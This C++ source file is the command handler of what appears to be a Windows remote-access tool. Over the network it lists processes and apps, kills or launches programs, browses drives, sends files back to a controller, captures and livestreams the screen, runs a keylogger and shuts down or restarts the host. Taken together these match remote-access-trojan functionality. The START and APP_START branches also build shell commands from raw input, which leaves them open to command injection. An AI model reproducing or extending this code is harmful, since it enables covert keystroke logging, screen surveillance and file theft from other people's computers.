#define WIN32_LEAN_AND_MEAN
#include "command_handler.h"
#include "../common/logger.h"
#include "../core/thread_manager.h"
#include "../core/process_manager.h"
#include "../core/app_manager.h"
// Note: screen_capture.h contains OpenCV headers that conflict with WinSock2
// We'll use forward declarations and careful handling
#include "../core/screen_capture.h"
#include "../core/livestream.h"
#include "../core/keylogger.h"
#include "../core/power_control.h"
#include "../core/constants.h"
#include "server_control.h"
#include "../common/string_utils.h"

#include <sstream>
#include <fstream>
#include <filesystem>
#include <thread>
#include <chrono>
#include <cctype>
#include <algorithm>
#include <vector>
#include <algorithm>
#include <cstdio>

#ifdef _WIN32
#include <windows.h>
#endif

CommandHandler::CommandHandler(
		Logger *logger,
		ThreadManager *threadManager,
		ProcessManager *processManager,
		AppManager *appManager,
		ScreenCapture *screenCapture,
		ServerController *serverController,
		LivestreamServer *livestreamServer,
		KeyloggerSender *keyloggerServer) : logger(logger),
																				threadManager(threadManager),
																				processManager(processManager),
																				appManager(appManager),
																				screenCapture(screenCapture),
																				serverController(serverController),
																				livestreamServer(livestreamServer),
																				keyloggerServer(keyloggerServer)
{
	logger->log("HANDLER", "CommandHandler initialized");
}

std::string CommandHandler::processCommand(const std::string &command)
{
	logger->log("PROCESS", "Processing command: " + command);
	cout << "Processing command: " << command << endl;
	std::string reply;

	// Ensure server directory exists
	std::filesystem::create_directories("./server");

	// Commands that use chunked data transfer
	if (command == "PROCESS_LIST" || command == "APP_LIST")
	{
		return handleProcessCommandsChunked(command);
	}
	// File system commands that use chunked transfer
	else if (command == "LS" || command.rfind("LS ", 0) == 0 || command.rfind("GET ", 0) == 0)
	{
		return handleFileCommandsChunked(command);
	}
	// Process control commands
	else if (command.rfind("START ", 0) == 0 ||
					 command.rfind("STOP ", 0) == 0)
	{
		reply = handleProcessCommands(command);
	}
	// Application commands
	else if (command.rfind("APP_START ", 0) == 0 ||
					 command.rfind("APP_STOP ", 0) == 0)
	{
		reply = handleAppCommands(command);
	}
	// Screen capture command
	else if (command == "SCREEN_CAPTURE")
	{
		return handleFileCommandsChunked(command);
	}
	// Streaming commands
	else if (command == "LIVESTREAM" || command == "STOPLIVESTREAM")
	{
		reply = handleStreamingCommands(command);
	}
	// Keylogger commands
	else if (command == "KEYLOG" || command == "STOPKEYLOG")
	{
		reply = handleKeyloggerCommands(command);
	}
	// System control commands
	else if (command == "SHUTDOWN" || command == "RESTART" || command == "STOP" || command == "EXIT")
	{
		reply = handleSystemCommands(command);
	}
	else
	{
		logger->log("UNKNOWN", "UNKNOWN COMMAND received: " + command);
		reply = "Unknown command: " + command;
	}

	return reply;
}

std::string CommandHandler::handleProcessCommands(const std::string &command)
{
	if (command == "PROCESS_LIST")
	{
		std::string csvData = processManager->getProcessList();

		// Save CSV data to server file for server-side logging
		std::filesystem::create_directories("./server");
		std::ofstream csvFile("./server/process_list.csv");
		if (csvFile.is_open())
		{
			csvFile << csvData;
			csvFile.close();
		}

		return csvData;
	}
	else if (command == "APP_LIST")
	{
		std::string csvData = appManager->listInstalledAppsAsCSV();

		// Save CSV data to server file for server-side logging
		std::filesystem::create_directories("./server");
		std::ofstream csvFile("./server/app_list.csv");
		if (csvFile.is_open())
		{
			csvFile << csvData;
			csvFile.close();
		}

		return csvData;
	}
	else if (command.rfind("START ", 0) == 0)
	{
		std::string processPath = command.substr(6);
		logger->log("START", "Starting process: " + processPath);

		// Use system command and capture output
		std::string systemCommand = "start \"\" \"" + processPath + "\" 2>&1";
		FILE *pipe = _popen(systemCommand.c_str(), "r");

		if (!pipe)
		{
			std::string response = "ERROR: Failed to execute start command - system error";
			cout << response << endl;
			logger->log("START", response);
			return response;
		}

		char buffer[512];
		std::string commandOutput;
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			commandOutput += buffer;
		}

		int result = _pclose(pipe);

		if (result == 0)
		{
			std::string response = "ACK: Process started successfully: " + processPath;
			cout << response << endl;
			logger->log("START", response);
			return response;
		}
		else
		{
			std::string response = commandOutput + " - " + processPath;
			cout << response << endl;
			logger->log("START", response);
			return response;
		}
	}
	else if (command.rfind("STOP ", 0) == 0)
	{
		std::string processIdentifier = command.substr(5);
		logger->log("STOP", "Stopping process: " + processIdentifier);

		std::string systemCommand;
		bool isNumericPID = true;

		// Check if it's a PID (all digits)
		for (char c : processIdentifier)
		{
			if (!std::isdigit(c))
			{
				isNumericPID = false;
				break;
			}
		}

		if (isNumericPID && !processIdentifier.empty())
		{
			// Stop by PID
			systemCommand = "taskkill /F /PID " + processIdentifier + " 2>&1";
		}
		else
		{
			// Stop by process name or path
			systemCommand = "taskkill /F /IM \"" + processIdentifier + "\" 2>&1";
		}

		FILE *pipe = _popen(systemCommand.c_str(), "r");

		if (!pipe)
		{
			std::string response = "ERROR: Failed to execute taskkill command - system error";
			cout << response << endl;
			logger->log("STOP", response);
			return response;
		}

		char buffer[512];
		std::string commandOutput;
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			commandOutput += buffer;
		}

		int result = _pclose(pipe);

		if (result == 0)
		{
			std::string response = "ACK: Process stopped successfully: " + processIdentifier;
			cout << response << endl;
			logger->log("STOP", response);
			return response;
		}
		else
		{
			std::string response = commandOutput + " - " + processIdentifier;
			cout << response << endl;
			logger->log("STOP", response);
			return response;
		}
	}
	else if (command.rfind("PROCESS_START ", 0) == 0)
	{
		std::string appPath = command.substr(14);
		bool success = processManager->startProcess(appPath);
		return success ? "Process started: " + appPath : "Failed to start process: " + appPath;
	}
	else if (command.rfind("PROCESS_STOP ", 0) == 0)
	{
		std::string pidStr = command.substr(13);
		try
		{
			DWORD pid = std::stoul(pidStr);
			bool success = processManager->stopProcessByPID(pid);
			return success ? "Process stopped (PID: " + pidStr + ")" : "Failed to stop process (PID: " + pidStr + ")";
		}
		catch (...)
		{
			return "Invalid PID: " + pidStr;
		}
	}

	return "Unknown process command";
}

std::string CommandHandler::handleAppCommands(const std::string &command)
{
	if (command.rfind("APP_START ", 0) == 0)
	{
		std::string appPath = command.substr(10);
		logger->log("APP_START", "Starting application: " + appPath);

		// Use system command and capture output
		std::string systemCommand = "start \"\" \"" + appPath + "\" 2>&1";
		FILE *pipe = _popen(systemCommand.c_str(), "r");

		if (!pipe)
		{
			std::string response = "ERROR: Failed to execute start command - system error";
			cout << response << endl;
			logger->log("APP_START", response);
			return response;
		}

		char buffer[512];
		std::string commandOutput;
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			commandOutput += buffer;
		}

		int result = _pclose(pipe);

		if (result == 0)
		{
			std::string response = "ACK: Application started successfully: " + appPath;
			cout << response << endl;
			logger->log("APP_START", response);
			return response;
		}
		else
		{
			std::string response = commandOutput + " - " + appPath;
			cout << response << endl;
			logger->log("APP_START", response);
			return response;
		}
	}
	else if (command.rfind("APP_STOP ", 0) == 0)
	{
		std::string appIdentifier = command.substr(9);

		// Trim whitespace
		appIdentifier.erase(0, appIdentifier.find_first_not_of(" \t\n\r\f\v"));
		appIdentifier.erase(appIdentifier.find_last_not_of(" \t\n\r\f\v") + 1);

		if (appIdentifier.empty())
		{
			std::string response = "ERROR: No application name provided for APP_STOP command";
			cout << response << endl;
			logger->log("APP_STOP", response);
			return response;
		}

		logger->log("APP_STOP", "Stopping application: " + appIdentifier);

		// Use system command for stopping application
		std::string systemCommand = "taskkill /F /IM \"" + appIdentifier + "\" 2>&1";
		FILE *pipe = _popen(systemCommand.c_str(), "r");

		if (!pipe)
		{
			std::string response = "ERROR: Failed to execute taskkill command - system error";
			cout << response << endl;
			logger->log("APP_STOP", response);
			return response;
		}

		char buffer[512];
		std::string commandOutput;
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			commandOutput += buffer;
		}

		int result = _pclose(pipe);

		if (result == 0)
		{
			std::string response = "ACK: Application stopped successfully: " + appIdentifier;
			cout << response << endl;
			logger->log("APP_STOP", response);
			return response;
		}
		else
		{
			std::string response = commandOutput + " - " + appIdentifier;
			cout << response << endl;
			logger->log("APP_STOP", response);
			return response;
		}
	}

	return "Unknown application command";
}
std::string CommandHandler::handleFileCommands(const std::string &command)
{
	if (command == "LS" || command.rfind("LS ", 0) == 0)
	{
		std::string dirPath;
		if (command == "LS")
		{
			dirPath = "."; // Default to current directory
		}
		else
		{
			dirPath = command.substr(3);
			// Trim leading/trailing whitespace
			size_t start = dirPath.find_first_not_of(" \t\n\r");
			size_t end = dirPath.find_last_not_of(" \t\n\r");
			if (start == std::string::npos)
			{
				dirPath = "."; // If only whitespace, default to current directory
			}
			else
			{
				dirPath = dirPath.substr(start, end - start + 1);
			}
		}
		return generateDirectoryListing(dirPath);
	}
	else if (command.rfind("GET ", 0) == 0)
	{
		std::string filepath = command.substr(4);
		if (filepath.empty())
		{
			return "Error: No file path specified";
		}
		else
		{
			try
			{
				if (!std::filesystem::exists(filepath))
				{
					return "Error: File does not exist: " + filepath;
				}
				else if (std::filesystem::is_directory(filepath))
				{
					return "Error: Path is a directory, not a file: " + filepath;
				}
				else
				{
					// Submit file transfer task to thread manager
					threadManager->submitDataTask([this, filepath]()
																				{
                        try
                        {
                            if (serverController->sendFile(filepath))
                            {
                                logger->log("FILE", "File sent successfully: " + filepath);
                            }
                            else
                            {
                                logger->log("FILE", "Failed to send file: " + filepath);
                            }
                        }
                        catch (const std::exception& e)
                        {
                            logger->log("FILE", "File transfer error: " + std::string(e.what()));
                        } }, TaskPriority::NORMAL);

					return "File transfer initiated asynchronously: " + filepath;
				}
			}
			catch (const std::exception &e)
			{
				return "Error: Failed to access file: " + std::string(e.what());
			}
		}
	}

	return "Unknown file command";
}

std::string CommandHandler::handleStreamingCommands(const std::string &command)
{
	if (command == "LIVESTREAM")
	{
		if (livestreamServer->isStreaming())
		{
			return "Livestream is already running";
		}
		else
		{
			logger->log("STREAM", "Starting livestream");
			if (livestreamServer->startLivestream(LIVESTREAM_PORT))
			{
				return "Livestream started on port " + std::to_string(LIVESTREAM_PORT);
			}
			else
			{
				return "Failed to start livestream";
			}
		}
	}
	else if (command == "STOPLIVESTREAM")
	{
		if (!livestreamServer->isStreaming())
		{
			return "Livestream is not running";
		}
		else
		{
			logger->log("STREAM", "Stopping livestream");
			livestreamServer->stopLivestream();
			return "Livestream stopped";
		}
	}

	return "Unknown streaming command";
}

std::string CommandHandler::handleKeyloggerCommands(const std::string &command)
{
	if (command == "KEYLOG")
	{
		if (keyloggerServer->start())
		{
			return "Keylogger started on port " + std::to_string(KEYLOGGER_PORT);
		}
		else
		{
			return "Failed to start keylogger server";
		}
	}
	else if (command == "STOPKEYLOG")
	{
		keyloggerServer->stop();
		return "Keylogger stopped";
	}

	return "Unknown keylogger command";
}

std::string CommandHandler::handleSystemCommands(const std::string &command)
{
	if (command == "SHUTDOWN")
	{
		logger->log("SHUTDOWN", "Shutdown command received - sending ACK first");
		// Send ACK response immediately, then schedule shutdown
		threadManager->submitBackgroundTask([this]()
																				{
			std::this_thread::sleep_for(std::chrono::seconds(2));
			shutdownComputer(); }, TaskPriority::LOW);
		return "ACK: Server shutdown initiated";
	}
	else if (command == "RESTART")
	{
		logger->log("RESTART", "Restart command received - sending ACK first");
		// Send ACK response immediately, then schedule restart
		threadManager->submitBackgroundTask([this]()
																				{
			std::this_thread::sleep_for(std::chrono::seconds(2));
			// Use system command for restart
			system("shutdown /r /t 0"); }, TaskPriority::LOW);
		return "ACK: Server restart initiated";
	}
	else if (command == "STOP")
	{
		std::this_thread::sleep_for(std::chrono::seconds(1));
		threadManager->submitBackgroundTask([]()
																				{ stopComputer(); }, TaskPriority::LOW);
		return "Server is stopping...";
	}
	else if (command == "EXIT")
	{
		return "Goodbye!";
	}

	return "Unknown system command";
}

bool CommandHandler::isShutdownCommand(const std::string &command) const
{
	return (command == "SHUTDOWN" || command == "EXIT");
}

std::vector<std::string> CommandHandler::getSupportedCommands() const
{
	return {
			"PROCESS_LIST", "APP_LIST",
			"START <path>", "STOP <pid>",
			"APP_START <path>", "APP_STOP <name>",
			"LS [path]", "GET <filepath>", "SCREEN_CAPTURE",
			"LIVESTREAM", "STOPLIVESTREAM",
			"KEYLOG", "STOPKEYLOG",
			"SHUTDOWN", "EXIT"};
}

// New chunked data transfer handlers
std::string CommandHandler::handleProcessCommandsChunked(const std::string &command)
{
	logger->log("CHUNKED", "Handling chunked command: " + command);

	if (command == "PROCESS_LIST")
	{
		std::string csvData = processManager->getProcessList();

		// Save CSV data to server file for server-side logging
		std::filesystem::create_directories("./server");
		std::ofstream csvFile("./server/process_list.csv");
		if (csvFile.is_open())
		{
			csvFile << csvData;
			csvFile.close();
		}

		// Send using chunked transfer with progress callback
		auto progressCallback = [this](const char *data, uint32_t currentChunk, uint32_t totalChunks, size_t bytesTransferred, size_t totalBytes)
		{
			logger->log("PROGRESS", "PROCESS_LIST: Chunk " + std::to_string(currentChunk) + "/" + std::to_string(totalChunks) +
																	" (" + std::to_string(bytesTransferred) + "/" + std::to_string(totalBytes) + " bytes)");
		};

		bool success = serverController->sendData(csvData.c_str(), csvData.size(), DataTransferCommand::PROCESS_LIST, progressCallback);

		return success ? "CHUNKED_SUCCESS" : "CHUNKED_ERROR";
	}
	else if (command == "APP_LIST")
	{
		std::string csvData = appManager->listInstalledAppsAsCSV();

		// Save CSV data to server file for server-side logging
		std::filesystem::create_directories("./server");
		std::ofstream csvFile("./server/app_list.csv");
		if (csvFile.is_open())
		{
			csvFile << csvData;
			csvFile.close();
		}

		// Send using chunked transfer with progress callback
		auto progressCallback = [this](const char *data, uint32_t currentChunk, uint32_t totalChunks, size_t bytesTransferred, size_t totalBytes)
		{
			logger->log("PROGRESS", "APP_LIST: Chunk " + std::to_string(currentChunk) + "/" + std::to_string(totalChunks) +
																	" (" + std::to_string(bytesTransferred) + "/" + std::to_string(totalBytes) + " bytes)");
		};

		bool success = serverController->sendData(csvData.c_str(), csvData.size(), DataTransferCommand::APP_LIST, progressCallback);

		return success ? "CHUNKED_SUCCESS" : "CHUNKED_ERROR";
	}

	return "Unknown chunked process command";
}

std::string CommandHandler::handleFileCommandsChunked(const std::string &command)
{
	logger->log("CHUNKED", "Handling chunked file command: " + command);

	if (command == "LS" || command.rfind("LS ", 0) == 0)
	{
		std::string dirPath;
		if (command == "LS")
		{
			dirPath = ""; // Default to listing drives for bare LS command
		}
		else
		{
			dirPath = command.substr(3);
			// Trim leading/trailing whitespace
			dirPath = trimString(dirPath);
			// Debug logging
			logger->log("DEBUG", "LS command parsed - Original: '" + command + "' -> DirPath: '" + dirPath + "'");

			// Normalize path separators for Windows
			std::replace(dirPath.begin(), dirPath.end(), '/', '\\');

			// Special handling for drive roots (e.g., "C:" -> "C:\\")
			if (dirPath.length() == 2 && dirPath[1] == ':')
			{
				dirPath += "\\";
			}

			logger->log("DEBUG", "After normalization: '" + dirPath + "'");

			// If empty after trim, list drives; otherwise use specified path
		}
		std::string dirData = generateDirectoryListing(dirPath);

		// Send using chunked transfer with progress callback
		auto progressCallback = [this](const char *data, uint32_t currentChunk, uint32_t totalChunks, size_t bytesTransferred, size_t totalBytes)
		{
			logger->log("PROGRESS", "LS: Chunk " + std::to_string(currentChunk) + "/" + std::to_string(totalChunks) +
																	" (" + std::to_string(bytesTransferred) + "/" + std::to_string(totalBytes) + " bytes)");
		};

		bool success = serverController->sendData(dirData.c_str(), dirData.size(), DataTransferCommand::LIST_DIR, progressCallback);

		return success ? "CHUNKED_SUCCESS" : "CHUNKED_ERROR";
	}
	else if (command.rfind("GET ", 0) == 0)
	{
		std::string filepath = command.substr(4);

		// Fix: Trim whitespace and remove quotes
		filepath = trimString(filepath);
		if (!filepath.empty() && filepath.front() == '"' && filepath.back() == '"')
		{
			filepath = filepath.substr(1, filepath.length() - 2);
		}

		logger->log("GET", "Processing file: " + filepath);

		// Check if file exists before sending
		if (!std::filesystem::exists(filepath))
		{
			logger->log("ERROR", "File not found: " + filepath);
			return "CHUNKED_ERROR: File not found";
		}

		// Check file size to prevent memory issues
		std::error_code ec;
		auto fileSize = std::filesystem::file_size(filepath, ec);
		if (ec)
		{
			logger->log("ERROR", "Cannot get file size: " + filepath);
			return "CHUNKED_ERROR: Cannot access file";
		}

		if (fileSize > MAX_ALLOWED_FILE_SIZE)
		{
			logger->log("ERROR", "File too large: " + filepath + " (" + std::to_string(fileSize) + " bytes)");
			return "CHUNKED_ERROR: File too large (max 500MB)";
		}

		logger->log("GET", "File size: " + std::to_string(fileSize) + " bytes");

		// Send file using chunked transfer with progress callback
		auto progressCallback = [this](const char *data, uint32_t currentChunk, uint32_t totalChunks, size_t bytesTransferred, size_t totalBytes)
		{
			logger->log("PROGRESS", "GET_FILE: Chunk " + std::to_string(currentChunk) + "/" + std::to_string(totalChunks) +
																	" (" + std::to_string(bytesTransferred) + "/" + std::to_string(totalBytes) + " bytes)");
		};

		bool success = serverController->sendFile(filepath, progressCallback);

		return success ? "CHUNKED_SUCCESS" : "CHUNKED_ERROR: File transfer failed";
	}
	else if (command == "SCREEN_CAPTURE")
	{
		logger->log("CAPTURE", "Screen capture requested");

		try
		{
			cv::Mat screenshot = screenCapture->captureFullScreen();
			if (screenshot.empty())
			{
				logger->log("ERROR", "Failed to capture screenshot");
				return "CHUNKED_ERROR: Screen capture failed";
			}

			std::vector<uint8_t> imageData = screenCapture->encodeToJPEG(screenshot, SCREEN_CAPTURE_JPEG_QUALITY);
			if (imageData.empty())
			{
				logger->log("ERROR", "Failed to encode screenshot");
				return "CHUNKED_ERROR: Image encoding failed";
			}

			logger->log("CAPTURE", "Screenshot captured, size: " + std::to_string(imageData.size()) + " bytes");

			auto progressCallback = [this](const char *data, uint32_t currentChunk, uint32_t totalChunks, size_t bytesTransferred, size_t totalBytes)
			{
				logger->log("PROGRESS", "SCREEN_CAPTURE: Chunk " + std::to_string(currentChunk) + "/" + std::to_string(totalChunks) +
																		" (" + std::to_string(bytesTransferred) + "/" + std::to_string(totalBytes) + " bytes)");
			};

			bool success = serverController->sendData(reinterpret_cast<const char *>(imageData.data()), imageData.size(), DataTransferCommand::SCREEN_CAPTURE, progressCallback);

			return success ? "CHUNKED_SUCCESS" : "CHUNKED_ERROR: Screen capture transfer failed";
		}
		catch (const std::exception &e)
		{
			logger->log("ERROR", "Screen capture exception: " + std::string(e.what()));
			return "CHUNKED_ERROR: Screen capture exception";
		}
	}

	return "Unknown chunked file command";
}

// Helper method for LS command processing
std::string CommandHandler::generateDirectoryListing(const std::string &dirPath)
{
	std::stringstream dirListing;

	try
	{
		logger->log("DEBUG", "generateDirectoryListing called with dirPath: '" + dirPath + "' (length: " + std::to_string(dirPath.length()) + ", empty: " + (dirPath.empty() ? "true" : "false") + ")");

		// Handle empty path - list drives
		if (dirPath.empty())
		{
			dirListing << "Available drives:\n";
#ifdef _WIN32
			DWORD drives = GetLogicalDrives();
			std::vector<std::string> driveList;

			for (char drive = 'A'; drive <= 'Z'; drive++)
			{
				if (drives & (1 << (drive - 'A')))
				{
					driveList.push_back(std::string(1, drive) + ":\\");
				}
			}

			// Sort drives alphabetically
			std::sort(driveList.begin(), driveList.end());

			for (const auto &drive : driveList)
			{
				dirListing << drive << "\n";
			}
#endif
		}
		else
		{
			if (!std::filesystem::exists(dirPath))
			{
				dirListing << "Error: Directory does not exist: " << dirPath << "\n";
			}
			else if (!std::filesystem::is_directory(dirPath))
			{
				dirListing << "Error: Path is not a directory: " << dirPath << "\n";
			}
			else
			{
				// Collect entries and sort alphabetically
				std::vector<std::pair<bool, std::string>> entries;

				for (const auto &entry : std::filesystem::directory_iterator(dirPath))
				{
					if (entry.is_directory())
					{
						entries.emplace_back(true, entry.path().filename().string());
					}
					else
					{
						auto fileSize = std::filesystem::file_size(entry.path());
						std::string entryStr = entry.path().filename().string() + " (" + std::to_string(fileSize) + " bytes)";
						entries.emplace_back(false, entryStr);
					}
				}

				// Sort entries alphabetically by filename
				std::sort(entries.begin(), entries.end(),
									[](const auto &a, const auto &b)
									{
										return a.second < b.second;
									});

				// Output sorted entries
				dirListing << "Directory listing for: " << dirPath << "\n";
				for (const auto &entry : entries)
				{
					if (entry.first) // Directory
					{
						dirListing << "[DIR]  " << entry.second << "\n";
					}
					else // File
					{
						dirListing << "[FILE] " << entry.second << "\n";
					}
				}
			}
		}
	}
	catch (const std::exception &e)
	{
		dirListing << "Error accessing directory: " << e.what() << "\n";
	}

	return dirListing.str();
}
